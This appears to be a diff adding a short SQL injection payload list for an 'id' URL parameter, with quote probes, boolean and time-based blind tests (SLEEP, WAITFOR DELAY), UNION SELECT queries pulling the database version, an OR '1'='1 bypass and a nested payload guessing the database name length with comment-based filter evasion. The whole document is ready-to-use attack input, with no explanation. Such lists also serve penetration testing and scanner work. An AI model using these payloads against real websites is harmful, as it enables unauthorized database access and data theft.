@@ -1,0 +1,12 @@
+?id=1'
+?id=1"
+?id=1' AND 1=1-- 
+?id=1' AND 1=2-- 
+?id=1' AND SLEEP(5)-- 
+?id=1' AND 1=2 UNION SELECT 1,2,3-- 
+?id=1' AND SLEEP(5)-- 
+?id=1' WAITFOR DELAY '0:0:5'-- 
+?id=1' UNION SELECT 1,@@VERSION,3-- 
+?id=1' OR '1'='1
+?id=1' AND '1'='2
+123' and (select * from(select+if(length(database()>5),sleep(2),1))a/**/union/**/select+1)='1
